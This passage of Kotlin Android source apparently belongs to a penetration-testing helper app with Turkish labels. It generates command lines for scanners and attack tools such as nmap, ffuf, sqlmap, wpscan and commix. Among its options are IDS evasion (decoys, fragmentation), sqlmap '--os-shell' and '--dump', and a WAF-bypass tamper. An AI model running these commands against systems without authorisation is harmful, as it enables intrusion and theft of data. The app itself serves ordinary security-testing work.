                        context.startActivity(Intent.createChooser(shareIntent, "Share Command"))
                    },
                    modifier = Modifier.size(26.dp)
                ) {
                    Icon(imageVector = Icons.Default.Share, contentDescription = "Share", tint = TextMuted, modifier = Modifier.size(14.dp))
                }
                Spacer(modifier = Modifier.width(2.dp))
                IconButton(
                    onClick = {
                        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                        clipboard.setPrimaryClip(ClipData.newPlainText("Command", command))
                        Toast.makeText(context, if (language == AppLanguage.TR) "Komut kopyalandı!" else "Command copied!", Toast.LENGTH_SHORT).show()
                    },
                    modifier = Modifier.size(26.dp)
                ) {
                    Icon(imageVector = Icons.Default.ContentCopy, contentDescription = "Copy", tint = CyberGreen, modifier = Modifier.size(15.dp))
                }
            }
        }

        // Code Body
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .horizontalScroll(rememberScrollState())
                .padding(12.dp)
        ) {
            Text(
                text = command,
                color = TextPrimary,
                fontSize = 12.5.sp,
                fontFamily = FontFamily.Monospace,
                lineHeight = 18.sp
            )
        }
    }
}

// -------------------------------------------------------------
// REUSABLE TOGGLE COMPONENT
// -------------------------------------------------------------
@Composable
fun ToggleOption(
    label: String,
    checked: Boolean,
    onCheckedChange: (Boolean) -> Unit
) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .clickable { onCheckedChange(!checked) }
            .padding(vertical = 4.dp),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.CenterVertically
    ) {
        Text(
            text = label,
            fontSize = 11.5.sp,
            fontFamily = FontFamily.Monospace,
            color = if (checked) TextPrimary else TextSecondary,
            modifier = Modifier.weight(1f)
        )
        Switch(
            checked = checked,
            onCheckedChange = onCheckedChange,
            colors = SwitchDefaults.colors(
                checkedThumbColor = BackgroundDark,
                checkedTrackColor = CyberGreen,
                uncheckedThumbColor = TextMuted,
                uncheckedTrackColor = SurfaceVariantDark
            )
        )
    }
}

// -------------------------------------------------------------
// BUILDER IMPLEMENTATIONS FOR EACH TOOL
// -------------------------------------------------------------

@Composable
fun NmapBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.100") }
    var portsOption by remember { mutableStateOf("top1000") }
    var customPorts by remember { mutableStateOf("80,443,8080,445") }
    var scanType by remember { mutableStateOf("-sS") }
    var enableVersionDetect by remember { mutableStateOf(true) }
    var enableDefaultScripts by remember { mutableStateOf(true) }
    var enableVulnScripts by remember { mutableStateOf(false) }
    var noPing by remember { mutableStateOf(true) }
    var timing by remember { mutableStateOf("-T4") }
    var outputFile by remember { mutableStateOf("scan.txt") }
    var enableOutput by remember { mutableStateOf(false) }
    var enableDecoy by remember { mutableStateOf(false) }
    var fragmentPackets by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Hedef IP / CIDR / Domain") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("top1000" to "--top-ports 1000", "all" to "-p- (65535)", "custom" to "Özel Port").forEach { (opt, lbl) ->
                val selected = portsOption == opt
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(8.dp)).background(if (selected) CyberGreen.copy(alpha = 0.15f) else SurfaceDark).border(1.dp, if (selected) CyberGreen else BorderDark, RoundedCornerShape(8.dp)).clickable { portsOption = opt }.padding(vertical = 8.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (selected) CyberGreen else TextSecondary) }
            }
        }
        if (portsOption == "custom") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(value = customPorts, onValueChange = { customPorts = it }, label = { Text("Portlar (örn: 80,443,8080)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("-sS" to "SYN Stealth", "-sT" to "TCP Connect", "-sU" to "UDP Scan").forEach { (type, lbl) ->
                val selected = scanType == type
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (selected) TerminalCyan.copy(alpha = 0.15f) else SurfaceDark).border(1.dp, if (selected) TerminalCyan else BorderDark, RoundedCornerShape(6.dp)).clickable { scanType = type }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 10.5.sp, fontFamily = FontFamily.Monospace, color = if (selected) TerminalCyan else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-sV Versiyon ve Servis Tespiti", checked = enableVersionDetect, onCheckedChange = { enableVersionDetect = it })
        ToggleOption(label = "-sC Varsayılan NSE Scriptleri", checked = enableDefaultScripts, onCheckedChange = { enableDefaultScripts = it })
        ToggleOption(label = "--script=vuln Bilinen Zafiyet Taraması", checked = enableVulnScripts, onCheckedChange = { enableVulnScripts = it })
        ToggleOption(label = "-Pn Ping Atlamadan Doğrudan Tara", checked = noPing, onCheckedChange = { noPing = it })
        ToggleOption(label = "-f Paketleri Parçala (Evasion)", checked = fragmentPackets, onCheckedChange = { fragmentPackets = it })
        ToggleOption(label = "-D RND:5 Sahte IP'lerle Karıştır (Decoy)", checked = enableDecoy, onCheckedChange = { enableDecoy = it })
        ToggleOption(label = "-oN scan.txt Çıktıyı Dosyaya Kaydet", checked = enableOutput, onCheckedChange = { enableOutput = it })

        val cmdParts = mutableListOf("nmap", scanType)
        if (enableVersionDetect) cmdParts.add("-sV")
        if (enableDefaultScripts) cmdParts.add("-sC")
        if (enableVulnScripts) cmdParts.add("--script=vuln")
        if (noPing) cmdParts.add("-Pn")
        if (fragmentPackets) cmdParts.add("-f")
        if (enableDecoy) cmdParts.add("-D RND:5")
        when (portsOption) { "all" -> cmdParts.add("-p-"); "custom" -> cmdParts.add("-p $customPorts") }
        cmdParts.add(timing)
        if (enableOutput) cmdParts.addAll(listOf("-oN", outputFile))
        cmdParts.add(target.trim())

        GeneratedCommandCard(command = cmdParts.joinToString(" "), language = language)
    }
}

@Composable
fun RustScanBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.100") }
    var portRange by remember { mutableStateOf("1-65535") }
    var batchSize by remember { mutableStateOf("4500") }
    var ulimit by remember { mutableStateOf("5000") }
    var pipeNmap by remember { mutableStateOf(true) }
    var nmapFlags by remember { mutableStateOf("-sC -sV") }

    Column {
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef IP (-a)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = portRange, onValueChange = { portRange = it }, label = { Text("Port Aralığı (-r)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = batchSize, onValueChange = { batchSize = it }, label = { Text("Batch Size (-b)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "Nmap ile Devam Et (-- $nmapFlags)", checked = pipeNmap, onCheckedChange = { pipeNmap = it })

        val cmd = if (pipeNmap) "rustscan -a $target -r $portRange -b $batchSize --ulimit $ulimit -- $nmapFlags"
                  else "rustscan -a $target -r $portRange -b $batchSize --ulimit $ulimit"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun MasscanBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.0/24") }
    var ports by remember { mutableStateOf("0-65535") }
    var rate by remember { mutableStateOf("1000") }
    var iface by remember { mutableStateOf("eth0") }
    var enableOutput by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef Ağ (CIDR / IP)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = ports, onValueChange = { ports = it }, label = { Text("Portlar (-p)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = rate, onValueChange = { rate = it }, label = { Text("Hız (--rate paket/sn)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-oL masscan.txt Çıktıyı Listeye Yaz", checked = enableOutput, onCheckedChange = { enableOutput = it })

        val cmd = "sudo masscan $target -p$ports --rate=$rate -e $iface" + if (enableOutput) " -oL masscan.txt" else ""
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun NaabuBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.100") }
    var topPorts by remember { mutableStateOf("1000") }
    var rate by remember { mutableStateOf("1000") }
    var silent by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef Host (-host)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = topPorts, onValueChange = { topPorts = it }, label = { Text("Top Port Sayısı (-top-ports)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-silent Sessiz / Yalnızca Açık Portlar", checked = silent, onCheckedChange = { silent = it })

        val cmd = "naabu -host $target -top-ports $topPorts -rate $rate" + if (silent) " -silent" else ""
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun DnsxBuilder(language: AppLanguage) {
    var domain by remember { mutableStateOf("target.com") }
    var wordlist by remember { mutableStateOf("subdomains.txt") }
    var resolveA by remember { mutableStateOf(true) }
    var resolveCname by remember { mutableStateOf(true) }
    var respOnly by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Hedef Alan Adı (-d)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = wordlist, onValueChange = { wordlist = it }, label = { Text("Subdomain Wordlist (-w)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-a A Kayıtlarını Çöz", checked = resolveA, onCheckedChange = { resolveA = it })
        ToggleOption(label = "-cname CNAME Kayıtlarını Çöz", checked = resolveCname, onCheckedChange = { resolveCname = it })
        ToggleOption(label = "-resp Sadece Yanıt Verenleri Listele", checked = respOnly, onCheckedChange = { respOnly = it })

        val flags = mutableListOf("dnsx", "-d", domain, "-w", wordlist)
        if (resolveA) flags.add("-a")
        if (resolveCname) flags.add("-cname")
        if (respOnly) flags.add("-resp")

        GeneratedCommandCard(command = flags.joinToString(" "), language = language)
    }
}

@Composable
fun FfufBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("http://10.10.10.100/FUZZ") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt") }
    var extensions by remember { mutableStateOf(".php,.txt,.html") }
    var enableExtensions by remember { mutableStateOf(false) }
    var filterCodes by remember { mutableStateOf("404") }
    var threads by remember { mutableStateOf("50") }
    var followRedirects by remember { mutableStateOf(true) }
    var useBurpProxy by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(value = url, onValueChange = { url = it }, label = { Text("Hedef URL (FUZZ etiketi içermeli)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = wordlist, onValueChange = { wordlist = it }, label = { Text("Wordlist Yolu (-w)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-e Uzantı Ekle (.php, .txt)", checked = enableExtensions, onCheckedChange = { enableExtensions = it })
        if (enableExtensions) {
            OutlinedTextField(value = extensions, onValueChange = { extensions = it }, label = { Text("Uzantılar (-e)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            Spacer(modifier = Modifier.height(6.dp))
        }
        ToggleOption(label = "-r Yönlendirmeleri Takip Et", checked = followRedirects, onCheckedChange = { followRedirects = it })
        ToggleOption(label = "-x Burp Suite Proxy (http://127.0.0.1:8080)", checked = useBurpProxy, onCheckedChange = { useBurpProxy = it })

        val cmd = mutableListOf("ffuf", "-u", url, "-w", wordlist, "-fc", filterCodes, "-t", threads)
        if (enableExtensions && extensions.isNotBlank()) cmd.addAll(listOf("-e", extensions))
        if (followRedirects) cmd.add("-r")
        if (useBurpProxy) cmd.addAll(listOf("-x", "http://127.0.0.1:8080"))

        GeneratedCommandCard(command = cmd.joinToString(" "), language = language)
    }
}

@Composable
fun GobusterBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("dir") } // dir, dns, vhost
    var url by remember { mutableStateOf("http://10.10.10.100/") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/dirb/common.txt") }
    var extensions by remember { mutableStateOf("php,txt,html") }
    var threads by remember { mutableStateOf("40") }
    var skipSsl by remember { mutableStateOf(true) }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("dir" to "Dizin (dir)", "dns" to "Subdomain (dns)", "vhost" to "Virtual Host").forEach { (m, lbl) ->
                val selected = mode == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (selected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (selected) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = url, onValueChange = { url = it }, label = { Text(if (mode == "dns") "Alan Adı (-d)" else "Hedef URL (-u)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = wordlist, onValueChange = { wordlist = it }, label = { Text("Wordlist (-w)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-k SSL Sertifika Doğrulamasını Atla", checked = skipSsl, onCheckedChange = { skipSsl = it })

        val cmd = mutableListOf("gobuster", mode)
        if (mode == "dns") cmd.addAll(listOf("-d", url, "-w", wordlist))
        else cmd.addAll(listOf("-u", url, "-w", wordlist, "-x", extensions, "-t", threads))
        if (skipSsl) cmd.add("-k")

        GeneratedCommandCard(command = cmd.joinToString(" "), language = language)
    }
}

@Composable
fun FeroxbusterBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("http://10.10.10.100/") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt") }
    var depth by remember { mutableStateOf("2") }
    var threads by remember { mutableStateOf("50") }
    var insecure by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = url, onValueChange = { url = it }, label = { Text("Hedef URL (-u)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = wordlist, onValueChange = { wordlist = it }, label = { Text("Wordlist (-w)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-k SSL Doğrulamasını Atla", checked = insecure, onCheckedChange = { insecure = it })

        val cmd = "feroxbuster -u $url -w $wordlist -d $depth -t $threads" + if (insecure) " -k" else ""
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun DirsearchBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("http://10.10.10.100/") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/dirb/common.txt") }
    var extensions by remember { mutableStateOf("php,txt,html,bak") }
    var randomAgent by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = url, onValueChange = { url = it }, label = { Text("Hedef URL (-u)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = extensions, onValueChange = { extensions = it }, label = { Text("Uzantılar (-e)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--random-agent Rastgele User-Agent", checked = randomAgent, onCheckedChange = { randomAgent = it })

        val cmd = "dirsearch -u $url -w $wordlist -e $extensions -t 50" + if (randomAgent) " --random-agent" else ""
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun NiktoBuilder(language: AppLanguage) {
    var host by remember { mutableStateOf("10.10.10.100") }
    var port by remember { mutableStateOf("80") }
    var useSsl by remember { mutableStateOf(false) }
    var tuning by remember { mutableStateOf("1,2,3,b") }
    var enableTuning by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(value = host, onValueChange = { host = it }, label = { Text("Hedef Host (-h)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = port, onValueChange = { port = it }, label = { Text("Port (-p)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-ssl HTTPS / SSL Kullan", checked = useSsl, onCheckedChange = { useSsl = it })

        val cmd = "nikto -h $host -p $port" + (if (useSsl) " -ssl" else "") + (if (enableTuning) " -Tuning $tuning" else "")
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun WhatWebBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("http://10.10.10.100") }
    var aggression by remember { mutableStateOf("3") }
    var verbose by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef URL") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("1" to "Pasif (1)", "3" to "Agresif (3)", "4" to "Ağır (4)").forEach { (lvl, lbl) ->
                val sel = aggression == lvl
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { aggression = lvl }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-v Detaylı Çıktı (Verbose)", checked = verbose, onCheckedChange = { verbose = it })

        val cmd = "whatweb -a $aggression $target" + if (verbose) " -v" else ""
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun WfuzzBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("http://10.10.10.100/FUZZ") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/dirb/common.txt") }
    var hideCode by remember { mutableStateOf("404") }

    Column {
        OutlinedTextField(value = url, onValueChange = { url = it }, label = { Text("Hedef URL (FUZZ anahtarlı)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = wordlist, onValueChange = { wordlist = it }, label = { Text("Payload Wordlist (-z)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(value = hideCode, onValueChange = { hideCode = it }, label = { Text("Gizlenecek Kod (--hc)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)

        val cmd = "wfuzz -c -z file,$wordlist --hc $hideCode $url"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun SqlmapBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("http://example.com/vuln.php?id=1") }
    var param by remember { mutableStateOf("id") }
    var action by remember { mutableStateOf("--dbs") }
    var batchMode by remember { mutableStateOf(true) }
    var randomAgent by remember { mutableStateOf(true) }
    var tamper by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(value = url, onValueChange = { url = it }, label = { Text("Hedef URL (-u)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = param, onValueChange = { param = it }, label = { Text("Hedef Parametre (-p)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("--dbs" to "Veritabanları", "--tables" to "Tablolar", "--dump" to "Tümünü Çek", "--os-shell" to "OS Shell").forEach { (act, lbl) ->
                val sel = action == act
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { action = act }.padding(horizontal = 8.dp, vertical = 5.dp)
                ) { Text(text = "$act ($lbl)", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextPrimary) }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--batch Soruları Otomatik Yanıtla", checked = batchMode, onCheckedChange = { batchMode = it })
        ToggleOption(label = "--random-agent Rastgele User-Agent", checked = randomAgent, onCheckedChange = { randomAgent = it })
        ToggleOption(label = "--tamper=space2comment WAF Atlama", checked = tamper, onCheckedChange = { tamper = it })

        val cmd = "sqlmap -u \"$url\" -p $param $action" + (if (batchMode) " --batch" else "") + (if (randomAgent) " --random-agent" else "") + (if (tamper) " --tamper=space2comment" else "")
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun WPScanBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("http://target.com/blog/") }
    var enumOptions by remember { mutableStateOf("u,vp,vt") }
    var apiToken by remember { mutableStateOf("") }
    var randomUserAgent by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = url, onValueChange = { url = it }, label = { Text("WordPress URL (--url)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = enumOptions, onValueChange = { enumOptions = it }, label = { Text("Numaralandırma (-e u=user, vp=vulnerable plugins)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = apiToken, onValueChange = { apiToken = it }, label = { Text("WPVDB API Token (Opsiyonel)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--random-user-agent Rastgele Tarayıcı", checked = randomUserAgent, onCheckedChange = { randomUserAgent = it })

        val cmd = "wpscan --url $url -e $enumOptions" + (if (randomUserAgent) " --random-user-agent" else "") + (if (apiToken.isNotBlank()) " --api-token ${apiToken.trim()}" else "")
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun CommixBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("http://example.com/command.php?ip=127.0.0.1") }
    var param by remember { mutableStateOf("ip") }
    var batch by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = url, onValueChange = { url = it }, label = { Text("Hedef URL (--url)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
